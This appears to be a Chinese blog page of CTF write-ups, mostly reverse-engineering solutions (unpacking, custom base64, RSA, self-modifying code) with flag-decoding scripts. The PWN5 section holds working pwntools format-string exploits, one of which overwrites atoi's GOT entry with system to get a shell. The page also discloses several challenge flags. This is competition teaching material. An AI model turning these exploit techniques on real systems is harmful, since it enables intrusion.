<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">uint8_t</span>* data, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s========&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(i % <span class="number">16</span>))<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n================================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> a[] = &#123;<span class="number">0x1e79</span>, <span class="number">0x1e79</span>, <span class="number">0x2135</span>, <span class="number">0x170d</span>, <span class="number">0x1f41</span>, <span class="number">0x1901</span>, <span class="number">0x2ced</span>, <span class="number">0x11f9</span>, <span class="number">0x2649</span>, <span class="number">0x2581</span>, <span class="number">0x2db5</span>, <span class="number">0x14b5</span>, <span class="number">0x25e5</span>, <span class="number">0x2a31</span>, <span class="number">0x30d5</span>&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> flag[<span class="number">16</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> xorD[] = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">15</span>;i++)&#123;</span><br><span class="line">        a[i]-=<span class="number">1</span>;</span><br><span class="line">        a[i]/=<span class="number">100</span>;</span><br><span class="line">        a[i]^=xorD[i%<span class="number">4</span>];</span><br><span class="line">        flag[i]=a[i]+xorD[i%<span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## [rev][De1CTF2019]Re_Sign

1. UPX加壳了，可是upx官方版说没加壳，使用upx官方版加壳又说加壳了= =，只好手动脱壳。具体操作为pushad之后栈上下硬件断点，F9到popad之后有个long jmp，jmp之后再单步调试法找到OEP在0x401000。之后使用Scylla插件dump内存为可执行文件，并且dump之后fix_dump
2. 程序使用了什么库(搜不到)，只能一步一步尝试
3. 关键函数
   - 401233使用了换表base64编码，调试发现的，具体生成表操作在401615到4016F0之间
   - 402160再找到字母在标准b64表中的位置

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES,AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/=&#x27;</span></span><br><span class="line"></span><br><span class="line">print(len(s))</span><br><span class="line">b64tab = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">dicn = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65</span>):</span><br><span class="line">    dic[s[i]]=b64tab[i]</span><br><span class="line">    dicn[b64tab[i]]=i</span><br><span class="line"></span><br><span class="line">fa = [<span class="number">0x08</span>,<span class="number">0x3B</span>,<span class="number">0x01</span>,<span class="number">0x20</span>,<span class="number">0x07</span>,<span class="number">0x34</span>,<span class="number">0x09</span>,<span class="number">0x1F</span>,<span class="number">0x18</span>,<span class="number">0x24</span>,<span class="number">0x13</span>,<span class="number">0x03</span>,<span class="number">0x10</span>,<span class="number">0x38</span>,<span class="number">0x09</span>,<span class="number">0x1B</span>,<span class="number">0x08</span>,<span class="number">0x34</span>,<span class="number">0x13</span>,<span class="number">0x02</span>,<span class="number">0x08</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x03</span>,<span class="number">0x05</span>,<span class="number">0x06</span>,<span class="number">0x12</span>,<span class="number">0x03</span>,<span class="number">0x0F</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x17</span>,<span class="number">0x08</span>,<span class="number">0x01</span>,<span class="number">0x29</span>,<span class="number">0x22</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x32</span>,<span class="number">0x24</span>,<span class="number">0x0F</span>,<span class="number">0x1F</span>,<span class="number">0x2B</span>,<span class="number">0x24</span>,<span class="number">0x03</span>,<span class="number">0x15</span>,<span class="number">0x41</span>,<span class="number">0x41</span>]</span><br><span class="line">fs = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fa:</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    fs+=b64tab[i<span class="number">-1</span>]</span><br><span class="line">print(fs)</span><br><span class="line">sfs = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fs:</span><br><span class="line">    sfs+=dic[i]</span><br><span class="line">print(sfs)</span><br><span class="line">print(base64.b64decode(bytes(sfs,encoding=<span class="string">&#x27;utf-8&#x27;</span>)))</span><br></pre></td></tr></table></figure>

## [rev]HellScream

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BigInteger</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> data[MAX_LEN];</span><br><span class="line">&#125; BigInteger;</span><br></pre></td></tr></table></figure>

1. 4019F0 a1的元素左移4位copy到a2上

2. 401940 a2的元素加到a1第一个dword上，溢出则溢出部分加到第二个数上面，以此类推

   从这里看出实现了一个大整数运算库

3. 406330 把int值转化成对应的base16串，小端字节序

4. 405310 把BigInteger放入数组

5. 406230 直接把字符串放入username对应的结构体data字段

6. 4020E0 根据406330得出大概是mod()，并且有三个参数，分别是被除数(也是余数的存放位置),商存放位置，除数

7. 403E30 猜测是mod n

8. 4018E0 复制String

9. 401910 将a1初始化为String且初始值为a2

10. 401510 check函数

    - 最终input=Happy Birthday Buddy
    - 核心逻辑似乎在401000
    - 4062A0 把结构体中的数据提取到input
    - 4064D0 pow mod n

看题解了，RSA算法

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES,AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">0xA324F100182D501F6F6F78F397A3AA59641023D6A3DED8A4BF344F1E0FC71C188F4D</span></span><br><span class="line">p = <span class="number">62822928286347608648869628628072621308819</span></span><br><span class="line">q = <span class="number">76979057716441943100156208562083628995999</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">e = powmod(<span class="number">0x6D6F632E6D736131352E777777</span>,<span class="number">17</span>,n)</span><br><span class="line"><span class="comment"># m = 0x6B6F007964647542207961646874726942207970706148 # Happy Birthday Buddy\x00ok</span></span><br><span class="line">m = <span class="number">0x7964647542207961646874726942207970706148</span></span><br><span class="line"><span class="comment"># E &lt;= e+99</span></span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    E = e+i</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d=invert(E,phi)</span><br><span class="line">        print(i)</span><br><span class="line">        print(hex(powmod(m,d,n)).upper())</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">r = <span class="number">0x1234567890</span></span><br><span class="line">print(hex(e))</span><br></pre></td></tr></table></figure>

## [rev]Snake

总是纠结于Assembly-CSharp.dll，实际上flag不在里面啊555

1. 查看各个类，发现有个Interface类是C代码写的，所以应该找到这个Interface，使用IDA打开
2. 然后查看各个方法的参考，其中GameObject在Move中被调用，传入的参数为x，y坐标，所以不会很大，观察常量为199
3. 直接加载dll爆破flag即可
4. 查看dll，利用了大整数库，应该是公钥加密之类的

<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    HMODULE hMod = LoadLibraryA(<span class="string">&quot;C:\\Users\\Tom\\Downloads\\Snake\\Snake_Data\\Plugins\\Interface.dll&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int64_t</span> <span class="params">(*FuncPtr)</span><span class="params">(<span class="keyword">int</span> i)</span></span>;</span><br><span class="line">    FuncPtr func = (FuncPtr) GetProcAddress(hMod,<span class="string">&quot;GameObject&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(hMod==<span class="literal">NULL</span>||func==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Load Failed&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">200</span>;i++)&#123;</span><br><span class="line">        func(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

flag&#123;Ch4rp_W1th_R$@&#125;

## [rev][HDCTF2019]MFC

MFC程序逆向

1. 程序加了VMP，一时半会儿弄不出来
2. 使用xspy得到一个奇怪的消息码：0x464
3. 使用对应的消息码给程序发消息，得到一个des key
4. 使用CE搜索Flag，发现上方不远处有一串字符串，就是加密过的文本

<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    HWND h = FindWindowW(<span class="literal">NULL</span>,<span class="string">L&quot;Flag就在控件里&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(h==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        SendMessage(h,<span class="number">0x464</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

http://tool.chacuo.net/cryptdes

## [pwn][第五空间2019 决赛]PWN5

printf可以实现任意地址读写

任意地址写的payload可以使用fmtstr_payload方法生成

### 1

在随机数出写入自定义的值

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x804c044</span></span><br><span class="line">payload = p32(addr)+p32(addr+<span class="number">1</span>)+p32(addr+<span class="number">2</span>)+p32(addr+<span class="number">3</span>)</span><br><span class="line">payload +=<span class="string">r&#x27;%10$hhn&#x27;</span>+<span class="string">r&#x27;%11$hhn&#x27;</span>+<span class="string">r&#x27;%12$hhn&#x27;</span>+<span class="string">r&#x27;%13$hhn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x10101010</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

### 2

修改atoi函数的got表指向system，然后传/bin/sh

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./pwn-1&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x804c044</span></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">atoi_addr = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;atoi_addr:sys_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

### 3

读取随机数的值，然后填那个值，需要注意符号。很不稳定，容易出现溢出，比如说正负数问题，只有在随机数为正时可以pwn

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/kali/Music/libc32/libc-2.23.so&#x27;)</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./pwn-1&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x804c044</span></span><br><span class="line">payload = p32(addr)+<span class="string">r&#x27;%10$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello,&#x27;</span>)</span><br><span class="line">res = p.recv()</span><br><span class="line">rand = u32(res[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">print(hex(rand))</span><br><span class="line">p.sendline(str(rand))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

### 参考资料

[BUUCTF - [第五空间2019 决赛]PWN5](https://www.jianshu.com/p/0501f4dbaf9e)

## [rev][ACTF新生赛2020]Splendid_MineCraft

自修改代码

1. 第一段flag验证的函数开头有个自修改，直接patch之后更改跳转地址
2. 第二段的比较，当时傻了，每一个byte都可以找任意地址的，然后找到地址的差
3. 第三段直接明文比较

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v7[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">char</span> v3[<span class="number">6</span>];</span><br><span class="line">    v3[<span class="number">0</span>] = <span class="number">101</span>;</span><br><span class="line">    v3[<span class="number">1</span>] = <span class="number">108</span>;</span><br><span class="line">    v3[<span class="number">2</span>] = <span class="number">99</span>;</span><br><span class="line">    v3[<span class="number">3</span>] = <span class="number">111</span>;</span><br><span class="line">    v3[<span class="number">4</span>] = <span class="number">109</span>;</span><br><span class="line">    v3[<span class="number">5</span>] = <span class="number">101</span>;</span><br><span class="line">    v7[<span class="number">0</span>] = <span class="number">51</span>;</span><br><span class="line">    v7[<span class="number">1</span>] = <span class="number">64</span>;</span><br><span class="line">    v7[<span class="number">2</span>] = <span class="number">49</span>;</span><br><span class="line">    v7[<span class="number">3</span>] = <span class="number">98</span>;</span><br><span class="line">    v7[<span class="number">4</span>] = <span class="number">59</span>;</span><br><span class="line">    v7[<span class="number">5</span>] = <span class="number">98</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">1024</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(flag,<span class="string">&quot;ACTF&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        flag[i+<span class="number">5</span>]=(v3[i]^v7[i])+<span class="number">35</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x,0x%x\n&quot;</span>,*(<span class="keyword">int32_t</span>*)(flag+<span class="number">5</span>),*(<span class="keyword">int16_t</span>*)(flag+<span class="number">9</span>));</span><br><span class="line">    <span class="keyword">uint8_t</span> r=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">5</span>;i&lt;<span class="number">11</span>;i++)&#123;</span><br><span class="line">        r^=flag[i];</span><br><span class="line">    &#125;</span><br><span class="line">    flag[<span class="number">11</span>]=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    <span class="comment">// knowo3</span></span><br><span class="line">    <span class="keyword">uint32_t</span> a[] = &#123;<span class="number">0x405100</span><span class="number">-0x405018</span>,<span class="number">0x405102</span><span class="number">-0x405018</span>,<span class="number">0x405102</span><span class="number">-0x405018</span>,<span class="number">0x405109</span><span class="number">-0x405018</span>,<span class="number">0x405100</span><span class="number">-0x405018</span>,<span class="number">0x4051D3</span><span class="number">-0x405018</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        flag[<span class="number">12</span>+i]=a[i]^(i+<span class="number">0x83</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// strcpy(&amp;flag[12],&quot;knowo3&quot;);</span></span><br><span class="line">    flag[<span class="number">18</span>]=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;flag[<span class="number">19</span>],<span class="string">&quot;5mcsM&lt;&quot;</span>);</span><br><span class="line">    flag[<span class="number">25</span>]=<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## 参考资料

[1] [buuoj[ACTF_Junior_2020]Splendid_MineCraft WriteUp](https://www.cnblogs.com/csuchenzc/p/13876127.html)

## [rev][SUCTF2019]hardcpp

1. deflat去混淆
2. 分析函数功能
3. v21=随机值
4. s[0]=&#39;#&#39;
5. s[v19]=enc[v19-1]
6. v21非1即0

